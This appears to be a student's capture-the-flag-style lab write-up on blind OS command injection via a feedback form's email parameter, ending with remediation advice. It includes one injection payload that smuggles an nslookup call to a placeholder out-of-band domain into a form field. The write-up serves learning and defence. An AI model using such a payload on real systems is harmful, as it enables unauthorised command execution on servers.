# Lab: Blind OS command injection with out-of-band interaction

> **Disclaimer:** This lab hasn't been fully solved, as even with the complete payload a burpsuite pro subscription is required, which i dont have.

## 1. Vulnerability Description
**Type:** Blind OS Command Injection (Out-of-Band/OAST)  
**Severity:** High  
**Vulnerable Endpoint:** `/feedback/submit`  

The application executes shell commands asynchronously based on user-supplied details. Because the command output is not returned and there is no writable directory accessible via the web, standard exfiltration techniques are not possible. Confirmation of the vulnerability requires forcing the server to interact with an external system. By triggering a DNS lookup via an injected command, an attacker can prove execution by observing the request on an external listener.

## 2. Steps to Reproduce
1.  **Identify Injection Point:** Use the `POST /feedback/submit` request identified in previous labs, specifically targeting the `email` parameter.
2.  **Select OOB Command:** Choose a command that triggers a network request, such as `nslookup`.
3.  **Construct Payload:** Use a shell connector to chain the command. The confirmed payload structure is:  
    `email=x%26nslookup+YOUR_ID.oastify.com%26`
4.  **Firewall Observation:** Attempting to use free public OAST listeners (like `interact.sh` or `requestrepo.com`) fails because the Academy's egress firewall blocks all non-official traffic. 
5.  **Requirement:** Successful confirmation requires a unique domain from the **Burp Collaborator** (provided with Burp Suite Professional), which uses the `oastify.com` domain whitelisted by the lab's environment.

## 3. Remediation
**Egress Filtering:**
Implement strict egress firewall rules to prevent the web server from initiating unauthorized outbound connections to the internet.

**Secure API Usage:**
Replace direct shell execution with secure, built-in library functions or APIs that do not invoke a command shell.
